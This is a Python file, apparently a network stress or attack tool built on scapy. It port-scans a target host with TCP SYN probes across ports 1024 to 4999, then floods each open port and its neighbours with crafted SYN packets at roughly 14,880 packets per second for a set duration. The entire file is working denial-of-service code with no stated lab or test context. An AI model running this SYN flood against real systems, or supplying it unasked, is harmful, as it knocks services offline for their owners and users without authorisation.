from scapy.all import *
import time
import random
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

class Suite:
    def __init__(self, iface, src_mac, src_ip, dst_mac, dst_ip, duration=120, rate_limit=14880):
        self.iface = iface
        self.src_mac = src_mac
        self.src_ip = src_ip
        self.dst_mac = dst_mac
        self.dst_ip = dst_ip
        self.duration = duration
        self.rate_limit = rate_limit
        self.open_ports = []
        self.open_ports_lock = threading.Lock()
        random.seed()

    def scan_port(self, port):
        pkt = IP(dst=self.dst_ip) / TCP(dport=port, flags='S')
        response = sr1(pkt, timeout=0.5, verbose=0)
        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            with self.open_ports_lock:
                self.open_ports.append(port)
            send(IP(dst=self.dst_ip) / TCP(dport=port, flags='R'), verbose=0)
            print(f"Open port found: {port}")

    def discover_open_ports(self):
        port_range = range(1024, 5000)
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = [executor.submit(self.scan_port, port) for port in port_range]
            for future in as_completed(futures):
                try:
                    future.result()
                except Exception as e:
                    print(f"Error scanning port: {e}")

    def generate_syn_packet(self, dst_port):
        eth_frame = Ether(src=self.src_mac, dst=self.dst_mac)
        ip_frame = IP(src=self.src_ip, dst=self.dst_ip)
        tcp_frame = TCP(sport=random.randint(1024, 65535), dport=dst_port, flags="S")
        packet = eth_frame / ip_frame / tcp_frame
        return packet

    def send_syn_storm(self):
        start_time = time.time()
        count = 0
        
        while time.time() - start_time < self.duration:
            for port in self.open_ports:
                packet = self.generate_syn_packet(port)
                sendp(packet, verbose=0, iface=self.iface)
                count += 1
                
                if port > 1:
                    packet = self.generate_syn_packet(port - 1)
                    sendp(packet, verbose=0, iface=self.iface)
                    count += 1
                if port < 65535:
                    packet = self.generate_syn_packet(port + 1)
                    sendp(packet, verbose=0, iface=self.iface)
                    count += 1
                
                if count >= self.rate_limit:
                    elapsed_time = time.time() - start_time
                    remaining_time = max(0, 1 - elapsed_time % 1)
                    time.sleep(remaining_time)
                    count = 0

    def run(self):
        print("Discovering open ports...")
        self.discover_open_ports()

        if not self.open_ports:
            print("No open ports discovered. Exiting.")
        else:
            print(f"Open ports discovered: {self.open_ports}")
            print(f"Sending SYN Storm packets to {self.dst_ip}...")
            self.send_syn_storm()